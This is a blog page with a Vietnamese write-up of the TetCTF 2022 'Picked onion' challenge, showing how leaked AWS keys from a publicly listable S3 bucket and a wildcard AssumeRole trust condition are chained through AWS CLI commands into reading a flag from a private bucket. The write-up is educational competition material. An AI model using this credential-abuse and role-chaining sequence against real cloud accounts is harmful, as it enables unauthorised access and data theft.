<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>phucdc's Blog</title>
<link
    rel="stylesheet"
    href="/assets/css/styles.css"
/>



<link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
<link rel="mask-icon" href="/assets/favicon/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">



<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<link
  rel="stylesheet"
  href="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js" integrity="sha512-IsNh5E3eYy3tr/JiX2Yx4vsCujtkhwl7SLqgnwLNgf04Hrt9BT9SXlLlZlWx+OK4ndzAoALhsMNcCmkggjZB1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2 bg-dark vh-100 sticky-top sidebar text-center">
    <div class="avatar">
        <img id="avatar" src="/assets/avatar.png" class="rounded-circle" alt="">
    </div> <br>
    <h3 class="text-white text-center">phucdc's Blog</h3>
    <hr class="text-white">
    <div class="nav">
        <ul>
            
           <li class="nav-item">
                <a href="/"><i class="bi bi-house"></i>Home</a>
           </li> 
           
           <li class="nav-item">
                <a href="/about/"><i class="bi bi-info-square"></i>About</a>
           </li> 
           
        </ul>
    </div>
    <div class="nav contact">
        <ul>
            
            <li class="nav-item">
                <a href="https://github.com/phucdc-noob">
                    <i class="bi bi-github"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="https://twitter.com/PhucdcN">
                    <i class="bi bi-twitter"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="https://www.facebook.com/phuc.duongcong5545/">
                    <i class="bi bi-facebook"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="mailto:phucbontu1012@gmail.com">
                    <i class="bi bi-envelope"></i>
                </a>
            </li>
            
        </ul>
    </div>
</div>


    

            <div class="main col-md-8" id="main">
                <div class="post" id="post">
    <h1>TetCTF 2022 | Web Exploitation | Picked onion</h1>
    <span>Jan 03, 22</span>
    <hr>
    <div id="post-content"><h1 id="picked-onion">Picked onion</h1>

<p><img src="https://user-images.githubusercontent.com/82533607/147910715-ae6e2f99-a294-4397-88bb-878d50561751.png" alt="chall" /></p>

<h2 id="reconaisance">Reconaisance</h2>

<p>Truy cập vào URL, ta thấy có một mục có tên là <code class="language-plaintext highlighter-rouge">Secret</code>, thử truy cập và thấy một bức ảnh. Ctrl U (view-source) thì thấy bức ảnh <code class="language-plaintext highlighter-rouge">href</code> là một <code class="language-plaintext highlighter-rouge">s3 bucket</code> có tên là <code class="language-plaintext highlighter-rouge">secret-tetctf</code>:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147911410-fa0489b2-e116-4a55-8f8c-3ebfe9588b4f.png" alt="secret_img" /></p>

<p>Điều đáng chú ý ở đây, là khi sửa URL thành <code class="language-plaintext highlighter-rouge">https://secret-tetctf.s3.amazonaws.com/</code> thì ta thấy:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147911956-a3d47c09-f901-4263-8f59-76a4fab0140e.png" alt="first_leak" /></p>

<p>Có thể chia làm 3 đoạn như sau:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secret-tetctf1000false
I've_Got_a_Secret.jpg2021-12-31T07:12:14.000Z"8176cb55798ee6c7df58496312ca82d8"12949STANDARD
secret2021-12-31T07:15:50.000Z"1ace2f1a8925799880ad32ef47b3e9d9"1239STANDARD
</code></pre></div></div>

<p>Đây là một lỗi Access Control của S3 Bucket, tại đây, ta có thể thấy còn một file <code class="language-plaintext highlighter-rouge">secret</code> nữa, mình sẽ tải nó về bằng URL: <code class="language-plaintext highlighter-rouge">https://secret-tetctf.s3.amazonaws.com/secret</code> và đọc nó:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147912573-6842e886-3c0d-4e54-a0bf-2e909c343f7e.png" alt="secret_file" /></p>

<p>Ta thu được <code class="language-plaintext highlighter-rouge">AWS_ACCESS_KEY_ID</code>, <code class="language-plaintext highlighter-rouge">AWS_SECRET_ACCESS_KEY</code> và <code class="language-plaintext highlighter-rouge">REGION_NAME</code> của IAM User được sử dụng cho <code class="language-plaintext highlighter-rouge">dynamodb</code>.</p>

<h2 id="exploit">Exploit</h2>

<p>Ban đầu khi đọc qua source code thì mình thấy nó giống hoàn toàn với <a href="https://ctrsec.io/index.php/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app/">bài viết này</a> của anh Chi Tran, nhưng tất nhiên, nếu vậy thì đơn giản quá:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147912969-f153ba6d-61a9-491f-8b65-1ee78a979c63.png" alt="fail_1" /></p>

<p>Có thể thấy, vấn đề ở đây là IAM User ddb_user mà ta đang sử dụng không có quyền hạn gì mấy để thực hiện exploit như bài viết ở trên.</p>

<p>Sau một hồi lục lọi trên doc của AWS thì mình thấy điều này:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws iam list-roles
<span class="go">{
    "Roles": [
</span><span class="c">        ...
</span><span class="go">        {
            "Path": "/",
            "RoleName": "CTF_ROLE",
            "RoleId": "AROAXNIS54O****************",
            "Arn": "arn:aws:iam::************:role/CTF_ROLE",
            "CreateDate": "2021-12-29T15:30:56Z",
            "AssumeRolePolicyDocument": {
                "Version": "2008-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "*"
                        },
                        "Action": "sts:AssumeRole",
                        "Condition": {
                            "StringLike": {
                                "aws:PrincipalArn": "arn:aws:iam::*:role/*-Accessing_Tet_CTF_Flag*"
                            }
                        }
                    }
                ]
            },
            "Description": "CTF_ROLE",
            "MaxSessionDuration": 3600
        }
    ]
}

</span></code></pre></div></div>

<p>Cùng hiểu một chút về đoạn JSON ở trên nhé?</p>

<p>Đây là một policy cho việc AssumeRole, ta thu được khá nhiều thông tin, đặc biệt nhất là Condittion cho việc AssumeRole, đó là chuỗi PrincipalArn trong request phải chứa một chuỗi <code class="language-plaintext highlighter-rouge">&lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt;</code>, cụ thể hơn thì chính xác cái user gửi request AssumeRole phải mang một IAM Role có tên với định dạng kể trên, như vậy, để thực hiện exploit, ta cần:</p>

<ul>
  <li>
    <p>Tạo một IAM User.</p>
  </li>
  <li>
    <p>Tạo một IAM Role có tên dưới dạng <code class="language-plaintext highlighter-rouge">&lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt;</code> mà IAM User vừa tạo có thể AssumeRole được.</p>
  </li>
  <li>
    <p>AssumeRole <code class="language-plaintext highlighter-rouge">&lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt;</code> vào IAM User đã tạo và lưu các creditials được trả về.</p>
  </li>
  <li>
    <p>AssumeRole <code class="language-plaintext highlighter-rouge">CTF_ROLE</code> ở trên và IAM User đã tạo, lưu lại creditials được trả về.</p>
  </li>
</ul>

<p>Giải thích lại một chút về ARN trong AWS, ARN là một chuỗi có dạng: <code class="language-plaintext highlighter-rouge">arn:partition:service:region:account:resource</code>, khi IAM User gửi bất kì request nào có yêu cầu credential, các chuỗi ARN sẽ được gửi đi, và chúng ta có thể sử dụng các chuỗi ARN này để viết policy phân quyền theo IAM Role cho các IAM User với điều kiện cụ thể.</p>

<p>Quay lại với vấn đề chính, vì không có AWS account để tạo IAM User nên mình đã inbox mượn anh Chi Tran một IAM User.</p>

<p>Sử dụng <code class="language-plaintext highlighter-rouge">aws configure</code> và điền các thông tin vào:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws configure
<span class="go">AWS Access Key ID [********************]: AKIAXNIS************
AWS Secret Access Key [********************]: VmK2ZWUVZ************************
Default region name [us-east-1]: 
Default output format [json]: 
</span></code></pre></div></div>

<p>Sau đó, tạo một file <code class="language-plaintext highlighter-rouge">Trust-policy.json</code>, sử dụng làm Policy cho Role mới (đừng làm theo ở thực tế, vì lý do bảo mật):</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">allow</span><span class="w"> </span><span class="err">all</span><span class="p">,</span><span class="w"> </span><span class="err">no</span><span class="w"> </span><span class="err">condittion</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Condition"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Và sử dụng <code class="language-plaintext highlighter-rouge">aws iam create-role --role-name &lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt; --assume-role-policy-document file://Trust-policy.json</code> để tạo Role, nhớ note lại ARN ở output</p>

<p>AssumeRole:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws sts assume-role <span class="nt">--role-arn</span> <span class="s2">"arn:aws:iam::***************:role/&lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt;"</span> <span class="nt">--role-session-name</span> &lt;anyname&gt;
<span class="go">{
    "Credentials": {
        "AccessKeyId": "access_key_id_here",
        "SecretAccessKey": "secret_access_key_here",
        "SessionToken": "long_token_here",
        "Expiration": "2022-01-03T09:02:51Z"
    },
    "AssumedRoleUser": {
</span><span class="gp">        "AssumedRoleId": "******************:&lt;anyname&gt;</span><span class="s2">",
</span><span class="gp">        "Arn": "arn:aws:sts::***************:assumed-role/&lt;anything&gt;</span><span class="s2">-Accessing_Tet_CTF_Flag&lt;anything&gt;/&lt;anyname&gt;"</span>
<span class="go">    }
}
</span></code></pre></div></div>

<p>Lưu credential vào Env:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>&lt;<span class="s2">"AccessKeyId"</span><span class="o">&gt;</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>&lt;<span class="s2">"SecretAccessKey"</span><span class="o">&gt;</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>&lt;<span class="s2">"SessionToken"</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Tiến hành AssumeRole <code class="language-plaintext highlighter-rouge">CTF_ROLE</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws sts assume-role <span class="nt">--role-arn</span> <span class="s2">"arn:aws:iam::***************:role/CTF_ROLE"</span> <span class="nt">--role-session-name</span> &lt;anyname&gt;
<span class="go">{
    "Credentials": {
        "AccessKeyId": "access_key_id_here",
        "SecretAccessKey": "secret_access_key_here",
        "SessionToken": "long_token_here",
        "Expiration": "2022-01-03T09:02:51Z"
    },
    "AssumedRoleUser": {
</span><span class="gp">        "AssumedRoleId": "******************:&lt;anyname&gt;</span><span class="s2">",
</span><span class="gp">        "Arn": "arn:aws:sts::***************:assumed-role/CTF_ROLE/&lt;anyname&gt;</span><span class="s2">"</span>
<span class="go">    }
}
</span></code></pre></div></div>

<p>Và lại lưu credentials:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>&lt;<span class="s2">"AccessKeyId"</span><span class="o">&gt;</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>&lt;<span class="s2">"SecretAccessKey"</span><span class="o">&gt;</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>&lt;<span class="s2">"SessionToken"</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Lúc này, ta đã có Role CTF_ROLE, nếu chưa chắc chắn, có thể kiểm tra bằng <code class="language-plaintext highlighter-rouge">aws sts get-caller-identity</code>, nếu thấy CTF_ROLE thì đã thành công.</p>

<p>Tiến hành list các bucket:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws s3api list-buckets <span class="nt">--query</span> <span class="s2">"Buckets[].Name"</span>
<span class="go">[
    "secret-tetctf",
    "tet-ctf-secret"
]
</span></code></pre></div></div>

<p>Vậy là ta thấy thêm một bucket nữa tên là <code class="language-plaintext highlighter-rouge">tet-ctf-secret</code>, kiểm tra xem trên đó có gì:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws s3 <span class="nb">ls </span>s3://tet-ctf-secret
<span class="go">2021-12-29 22:18:42         29 flag
</span></code></pre></div></div>

<p>Có file flag, thử lấy nó về và đọc:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws s3 <span class="nb">cp </span>s3://tet-ctf-secret/flag flag
<span class="go">download: s3://tet-ctf-secret/flag to ./flag 

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>flag
<span class="go">TetCTF{AssumE_R0le-iS-A-MuSt}
</span></code></pre></div></div>

<p>Done, flag: <code class="language-plaintext highlighter-rouge">TetCTF{AssumE_R0le-iS-A-MuSt}</code></p>

<blockquote>
  <p>Cảm ơn anh Chi Tran, đồng thời là người ra đề của chall này, đã cho em mượn IAM User và chỉ dẫn em trong quá trình giải, cũng như là học thêm kiến thức mới!</p>
</blockquote>
</div>
</div>
<script>
    var imgEl = document.getElementsByTagName('img');
    for (var i=0; i<imgEl.length; i++) {
        if (imgEl[i].getAttribute('src') && imgEl[i].id != 'avatar') {
        imgEl[i].setAttribute('data-src',imgEl[i].getAttribute('src'));
        imgEl[i].removeAttribute('src'); //use only if you need to remove data-src attribute after setting src
        }
    }
    $(function() {

        const IMG_SCOPE = '.main .post';
      
        if ($(`${IMG_SCOPE} img`).length <= 0 ) {
          return;
        }
      
        /* lazy loading */
      
        const imgList = document.querySelectorAll(`${IMG_SCOPE} img[data-src]`);
        const observer = lozad(imgList);
        observer.observe();
      
        /* popup */
      
        $(`${IMG_SCOPE} p > img[data-src],${IMG_SCOPE} img[data-src].preview-img`).each(
          function() {
            let nextTag = $(this).next();
            const title = nextTag.prop('tagName') === 'EM' ? nextTag.text() : '';
            const src = $(this).attr('data-src'); // created by lozad.js
      
            $(this).wrap(`<a href="${src}" title="${title}" class="popup"></a>`);
          }
        );
      
        $('.popup').magnificPopup({
          type: 'image',
          closeOnContentClick: true,
          showCloseBtn: false,
          zoom: {
            enabled: true,
            duration: 300,
            easing: 'ease-in-out'
          }
        });
      
        /* markup the image links */
      
        $(`${IMG_SCOPE} a`).has('img').addClass('img-link');
      
      });
</script>
            </div>
            




<div class="col-md-2 bg-black vh-100 sticky-top toc-container" > 
  <span class="text-white">Content</span><br><br>
  <div id="toc">

  </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
<script>
  tocbot.init({
    // Where to render the table of contents.
    tocSelector: '#toc',
    // Where to grab the headings to build the table of contents.
    contentSelector: '#post-content',
    // Which headings to grab inside of the contentSelector element.
    headingSelector: 'h2, h3, h4, h5, h6',
    // For headings inside relative or absolute positioned containers within content.
    hasInnerContainers: true,
  });
</script>


        </div>
    </div>
    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
          tex2jax: {
            inlineMath: [['$','$'], ['\\(','\\)']],
            processEscapes: true
          }
        });
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
</body>
</html>


